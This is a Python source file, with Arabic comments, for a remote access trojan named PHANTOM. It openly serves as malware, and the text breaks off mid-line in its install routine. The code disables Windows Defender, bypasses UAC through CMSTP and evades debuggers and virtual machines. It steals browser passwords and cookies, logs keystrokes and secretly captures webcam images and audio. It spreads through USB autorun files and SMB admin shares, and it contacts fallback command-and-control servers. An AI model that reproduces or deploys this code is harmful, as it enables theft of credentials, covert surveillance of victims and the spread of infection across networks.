# ============================================
# PHANTOM - Advanced Modular RAT
# ============================================

import socket
import subprocess
import os
import sys
import time
import threading
import shutil
import sqlite3
import winreg
import json
import base64
import random
import string
import hashlib
import zipfile
import ctypes
import struct
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import psutil
import win32gui
import win32process
import win32api
import win32con
import win32security
import wmi
import requests
from urllib.parse import urlparse
import cv2
import numpy as np
from PIL import ImageGrab
import wave
import pyaudio
import browser_cookie3
import win32crypt
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import pickle

# ============================================
# التكوين المتقدم
# ============================================
class Config:
    """تكوين متعدد الطبقات مع تشفير"""
    
    # خوادم احتياطية متعددة
    C2_SERVERS = [
        ("192.168.1.100", 4444),    # رئيسي
        ("10.0.0.50", 8080),        # احتياطي 1
        ("backup-domain.com", 443),  # احتياطي 2 - عبر DNS tunneling
    ]
    
    # مفتاح التشفير الرئيسي - يتغير ديناميكيًا
    MASTER_KEY = hashlib.sha256(b"phantom_master_seed").digest()
    
    # مدة النوم بين محاولات الاتصال
    SLEEP_INTERVALS = [5, 10, 30, 60, 300, 600, 3600]  # تصاعدي
    
    # أنماط التشغيل
    STEALTH_MODE = True
    PERSISTENCE_DEEP = True
    ENCRYPT_TRAFFIC = True
    ANTI_DEBUG = True
    ANTI_VM = True
    PROCESS_HOLLOWING = True
    
    # بصمات وهمية
    FAKE_PROCESS_NAMES = [
        "svchost.exe", "explorer.exe", "RuntimeBroker.exe",
        "SearchIndexer.exe", "spoolsv.exe", "lsass.exe",
        "winlogon.exe", "csrss.exe", "smss.exe"
    ]

# ============================================
# نظام مكافحة الاكتشاف
# ============================================
class AntiDetection:
    """نظام متقدم للتهرب من مكافحات الفيروسات والتحليل"""
    
    @staticmethod
    def anti_debug():
        """كشف وتجنب الـ Debuggers"""
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
        
        # فحص NtGlobalFlag
        PEB = ctypes.cast(
            ctypes.windll.ntdll.NtCurrentTeb(),
            ctypes.POINTER(ctypes.c_void_p)
        )
        if PEB:
            flags = struct.unpack("I", ctypes.string_at(PEB[0].value + 0x68, 4))[0]
            if flags & 0x70:
                sys.exit(0)
    
    @staticmethod
    def anti_vm():
        """كشف البيئات الافتراضية"""
        vm_indicators = [
            "vbox", "vmware", "qemu", "virtual", "xen",
            "hyper-v", "parallels", "sandbox"
        ]
        
        # فحص العمليات
        for proc in psutil.process_iter(['name']):
            if any(vm in proc.info['name'].lower() for vm in vm_indicators):
                return True
        
        # فحص الـ MAC addresses
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,48,8)][::-1])
        vm_macs = ["00:0c:29", "00:1c:14", "00:50:56", "00:05:69", "08:00:27"]
        for vm_mac in vm_macs:
            if mac.lower().startswith(vm_mac):
                return True
        
        return False
    
    @staticmethod
    def obfuscate_code(code):
        """تشويش الكود في الذاكرة"""
        # XOR encryption مع مفتاح ديناميكي
        key = random.randint(1, 255)
        return bytes([b ^ key for b in code]), key
    
    @staticmethod
    def polymorphic_mutation():
        """تعديل البصمة الرقمية للفيروس"""
        # تغيير أسماء المتغيرات
        new_names = {
            'socket': f"sock_{random.randint(1000,9999)}",
            'subprocess': f"sub_{random.randint(1000,9999)}",
        }
        # إضافة كود وهمي
        junk_code = """
def dummy():
    x = random.randint(1,100)
    y = x * 2
    return y
"""
        exec(junk_code)
    
    @staticmethod
    def disable_defender():
        """تعطيل Windows Defender"""
        try:
            commands = [
                "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
                "powershell Set-MpPreference -DisableBehaviorMonitoring $true",
                "powershell Set-MpPreference -DisableBlockAtFirstSeen $true",
                "powershell Set-MpPreference -DisableIOAVProtection $true",
                "powershell Set-MpPreference -DisablePrivacyMode $true",
                "powershell Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
                "powershell Set-MpPreference -DisableArchiveScanning $true",
                "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true",
                "powershell Set-MpPreference -DisableScriptScanning $true",
                "powershell Set-MpPreference -SubmitSamplesConsent 2",
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
    
    @staticmethod
    def bypass_uac():
        """تجاوز User Account Control"""
        try:
            # CMSTP UAC bypass
            cmd = 'cmstp.exe /ni /s C:\\Windows\\Tasks\\bypass.inf'
            with open("bypass.inf", "w") as f:
                f.write("""
[Version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
taskkill /IM cmstp.exe /F
[CustomDestination]
494e6f7221207b3d3d
""")
            subprocess.run(cmd, shell=True)
        except:
            pass

# ============================================
# نظام التشفير المتقدم
# ============================================
class AdvancedEncryption:
    """تشفير متعدد الطبقات للاتصالات والبيانات"""
    
    @staticmethod
    def generate_dynamic_key():
        """توليد مفتاح تشفير ديناميكي"""
        timestamp = str(time.time()).encode()
        random_seed = os.urandom(32)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=random_seed,
            iterations=100000,
            backend=default_backend()
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(timestamp + random_seed))
        return key
    
    @staticmethod
    def aes_encrypt(data, key):
        """تشفير AES-256"""
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(iv + encrypted).decode()
    
    @staticmethod
    def aes_decrypt(encrypted_data, key):
        """فك تشفير AES-256"""
        raw = base64.b64decode(encrypted_data)
        iv = raw[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(raw[16:]), AES.block_size)
        return decrypted.decode()
    
    @staticmethod
    def xor_encrypt(data, key):
        """تشفير XOR مع مفتاح متغير"""
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# ============================================
# وحدة التجسس المتقدمة
# ============================================
class SpyModule:
    """وحدات تجسس متطورة"""
    
    @staticmethod
    def capture_webcam():
        """التقاط صورة من الكاميرا"""
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
            cap.release()
        except:
            return None
    
    @staticmethod
    def record_audio(duration=30):
        """تسجيل صوتي"""
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # حفظ مؤقت
            with wave.open("audio.wav", 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
            
            with open("audio.wav", "rb") as f:
                return base64.b64encode(f.read()).decode()
        except:
            return None
    
    @staticmethod
    def steal_all_passwords():
        """سرقة كلمات المرور من جميع المتصفحات"""
        passwords = {
            "chrome": [],
            "firefox": [],
            "edge": [],
            "opera": [],
            "brave": []
        }
        
        try:
            # Chrome/Edge/Brave
            browsers = {
                "chrome": os.path.join(os.getenv('LOCALAPPDATA'), 
                         'Google', 'Chrome', 'User Data'),
                "edge": os.path.join(os.getenv('LOCALAPPDATA'), 
                        'Microsoft', 'Edge', 'User Data'),
                "brave": os.path.join(os.getenv('LOCALAPPDATA'), 
                         'BraveSoftware', 'Brave-Browser', 'User Data')
            }
            
            for browser_name, browser_path in browsers.items():
                if os.path.exists(browser_path):
                    login_db = os.path.join(browser_path, 'Default', 'Login Data')
                    if os.path.exists(login_db):
                        temp_db = os.path.join(os.getenv('TEMP'), f'{browser_name}_db')
                        shutil.copy2(login_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for url, username, encrypted_password in cursor.fetchall():
                            try:
                                password = win32crypt.CryptUnprotectData(
                                    encrypted_password, None, None, None, 0
                                )[1].decode()
                                passwords[browser_name].append({
                                    "url": url,
                                    "username": username,
                                    "password": password
                                })
                            except:
                                pass
                        
                        conn.close()
                        os.remove(temp_db)
            
            # Firefox
            firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    if profile.endswith('.default-release'):
                        cookies_db = os.path.join(firefox_path, profile, 'cookies.sqlite')
                        if os.path.exists(cookies_db):
                            temp_db = os.path.join(os.getenv('TEMP'), 'firefox_db')
                            shutil.copy2(cookies_db, temp_db)
                            # Firefox uses different decryption
                            # Implementation would go here
                            os.remove(temp_db)
            
        except Exception as e:
            pass
        
        return json.dumps(passwords)
    
    @staticmethod
    def steal_cookies():
        """سرقة كوكيز المتصفحات"""
        cookies = {}
        try:
            import browser_cookie3
            for browser in ['chrome', 'firefox', 'edge', 'opera', 'brave']:
                try:
                    cj = getattr(browser_cookie3, browser)(domain_name=None)
                    cookies[browser] = []
                    for cookie in cj:
                        cookies[browser].append({
                            "domain": cookie.domain,
                            "name": cookie.name,
                            "value": cookie.value,
                            "expires": cookie.expires
                        })
                except:
                    pass
        except:
            pass
        return json.dumps(cookies)
    
    @staticmethod
    def scan_network():
        """مسح الشبكة المحلية"""
        devices = []
        try:
            import scapy.all as scapy
            arp_request = scapy.ARP(pdst="192.168.1.0/24")
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            for element in answered_list:
                devices.append({
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc
                })
        except:
            pass
        return json.dumps(devices)

# ============================================
# وحدة الانتشار
# ============================================
class Spreader:
    """نظام انتشار متقدم"""
    
    @staticmethod
    def usb_infection():
        """إصابة أجهزة USB"""
        while True:
            drives = [d for d in win32api.GetLogicalDriveStrings().split('\x00') 
                     if d and win32api.GetDriveType(d) == win32con.DRIVE_REMOVABLE]
            
            for drive in drives:
                try:
                    target = os.path.join(drive, "autorun.inf")
                    virus_path = os.path.join(drive, "SystemVolumeInformation.exe")
                    
                    # نسخ الفيروس
                    shutil.copy2(sys.executable, virus_path)
                    
                    # إنشاء autorun.inf مخفي
                    with open(target, "w") as f:
                        f.write("""
[AutoRun]
open=SystemVolumeInformation.exe
icon=SystemVolumeInformation.exe,0
action=Open folder to view files
shell\open\command=SystemVolumeInformation.exe
shell\explore\command=SystemVolumeInformation.exe
""")
                    # إخفاء الملفات
                    win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN | 
                                             win32con.FILE_ATTRIBUTE_SYSTEM)
                    win32api.SetFileAttributes(virus_path, win32con.FILE_ATTRIBUTE_HIDDEN | 
                                             win32con.FILE_ATTRIBUTE_SYSTEM)
                except:
                    pass
            
            time.sleep(60)
    
    @staticmethod
    def network_spread():
        """الانتشار عبر الشبكة"""
        try:
            # SMB exploitation
            targets = Spreader.scan_vulnerable_smb()
            for target in targets:
                try:
                    # Copy via admin shares
                    dest = f"\\\\{target}\\C$\\Windows\\Temp\\svchost.exe"
                    shutil.copy2(sys.executable, dest)
                    
                    # Execute via WMI
                    c = wmi.WMI(target)
                    process = c.Win32_Process
                    process.Create(f"C:\\Windows\\Temp\\svchost.exe")
                except:
                    pass
        except:
            pass
    
    @staticmethod
    def scan_vulnerable_smb():
        """فحص أجهزة SMB الضعيفة"""
        vulnerable = []
        import socket
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((ip, 445))
            if result == 0:
                vulnerable.append(ip)
            sock.close()
        return vulnerable

# ============================================
# نظام الاتصال المتقدم
# ============================================
class C2Communication:
    """نظام اتصال متعدد البروتوكولات"""
    
    def __init__(self):
        self.encryption = AdvancedEncryption()
        self.current_server = 0
        self.sleep_index = 0
    
    def connect(self):
        """الاتصال مع تجاوز الفشل التلقائي"""
        while True:
            server = Config.C2_SERVERS[self.current_server]
            protocol = self.select_protocol()
            
            try:
                if protocol == "tcp":
                    return self.tcp_connect(server)
                elif protocol == "http":
                    return self.http_connect(server)
                elif protocol == "dns":
                    return self.dns_connect(server)
            except:
                self.current_server = (self.current_server + 1) % len(Config.C2_SERVERS)
                time.sleep(Config.SLEEP_INTERVALS[self.sleep_index])
                self.sleep_index = min(self.sleep_index + 1, len(Config.SLEEP_INTERVALS) - 1)
    
    def select_protocol(self):
        """اختيار بروتوكول الاتصال"""
        protocols = ["tcp", "http", "dns"]
        return random.choice(protocols)
    
    def tcp_connect(self, server):
        """اتصال TCP مشفر"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect(server)
        
        # TLS handshake وهمي
        sock.send(b"\x16\x03\x01\x00\x75")  # Client Hello
        sock.recv(1024)  # Server Hello
        
        return sock
    
    def http_connect(self, server):
        """اتصال عبر HTTP/HTTPS"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        return session
    
    def dns_connect(self, server):
        """اتصال عبر DNS tunneling"""
        # Implementation of DNS tunneling
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ============================================
# الرئيسي
# ============================================
class PhantomRAT:
    """الفيروس الرئيسي"""
    
    def __init__(self):
        self.anti_detection = AntiDetection()
        self.spy = SpyModule()
        self.spreader = Spreader()
        self.communication = C2Communication()
        self.keylogger = keyboard.Listener(on_press=self.on_key_press)
        self.keylog_data = []
        
    def on_key_press(self, key):
        """مسجل مفاتيح متقدم"""
        try:
            timestamp = datetime.now().isoformat()
            active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            
            if hasattr(key, 'char'):
                self.keylog_data.append({
                    "time": timestamp,
                    "window": active_window,
                    "key": key.char
                })
            else:
                special_keys = {
                    keyboard.Key.space: "[SPACE]",
                    keyboard.Key.enter: "[ENTER]\n",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.backspace: "[BACKSPACE]",
                    keyboard.Key.esc: "[ESC]",
                }
                self.keylog_data.append({
                    "time": timestamp,
                    "window": active_window,
                    "key": special_keys.get(key, f"[{key}]")
                })
        except:
            pass
    
    def install(self):
        """تثبيت الفيروس في النظام"""
        # Anti-detection checks
        if Config.ANTI_DEBU